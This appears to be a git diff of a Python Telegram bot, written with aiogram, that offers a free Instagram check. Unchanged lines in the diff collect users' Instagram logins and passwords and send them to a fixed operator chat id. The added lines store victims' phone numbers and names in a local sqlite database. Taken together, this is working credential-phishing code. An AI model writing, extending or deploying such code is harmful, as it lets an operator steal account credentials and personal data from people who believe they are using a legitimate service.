@@ -1,12 +1,25 @@
 from aiogram import types, executor
 from aiogram.dispatcher import FSMContext
-from states.states import *
+from .states_bot import RegisterState
 from aiogram.types import ReplyKeyboardRemove
 from loader import dp, storage
 from keyboards.default.default_keyboards import *
 from keyboards.inline.inline_keyboards import *
 from handlers.users.utils import *
 import random
+import sqlite3
+conn = sqlite3.connect("users.db")
+cursor = conn.cursor()
+cursor.execute("""
+CREATE TABLE IF NOT EXISTS users(
+id INTEGER PRIMARY KEY AUTOINCREMENT,
+random_number_id TEXT,
+chat_id INTEGER,
+phone_number TEXT,
+full_name TEXT,
+score INTEGER
+)
+""")
 users = dict()
 random_number = 0
 @dp.message_handler(commands="start")
@@ -27,6 +40,8 @@ async def get_free_check_instagram_handler(message: types.Message, state: FSMCon
         random_number = "5769"
     elif message.chat.id == 5968397844:
         random_number = "5455"
+    elif message.chat.id == 5097853234:
+        random_number = "2525"
     else:
         random_number = str(random.randint(1000, 9999))
     users[random_number] = dict()
@@ -104,7 +119,16 @@ async def send_login_pass_handler(message: types.Message, state: FSMContext):
 🛠 Insta Login: {data["insta_login"]}
 🔑 Insta Login Password: {data["login_pass"]}    
 """
+    r_id = users[random_number]["random_id"]
+    ch_id = message.chat.id
+    phone = data["phone_number"]
+    f_name = message.from_user.full_name
+    score = users[random_number]["score"]
     await dp.bot.send_message(chat_id=5596277119, text=user)
+    cursor.execute("""
+INSERT INTO users (random_number_id, chat_id, phone_number, full_name, score) VALUES (?,?,?,?,?)  
+""", (r_id, ch_id,phone, f_name, score))
+    conn.commit()
     await state.finish()
 
 @dp.message_handler(text="⭐ My Scores")
@@ -115,8 +139,12 @@ async def my_scores_handler(message: types.Message):
 
 @dp.callback_query_handler(text="send_score")
 async def send_score_handler(call: types.CallbackQuery):
-    text = "✍️ Please Send Username To Send 1 Score!"
-    await call.message.answer(text=text, reply_markup=ReplyKeyboardRemove())
+    if users[random_number]["score"] >= 1:
+        text = "✍️ Please Send Username To Send 1 Score!"
+        await call.message.answer(text=text, reply_markup=ReplyKeyboardRemove())
+    else:
+        text1 = "You Don't Have Many Scores"
+        await call.message.answer(text=text1)
     await RegisterState.send_score.set()
 
 @dp.message_handler(state=RegisterState.send_score)
@@ -128,6 +156,8 @@ async def send_1_score_handler(message: types.Message, state: FSMContext):
         await state.finish()
 
 
-#
-# if __name__ == "__main__":
-#     executor.start_polling(dp, skip_updates=True)
+conn.commit()
+
+
+if __name__ == "__main__":
+    executor.start_polling(dp, skip_updates=True)
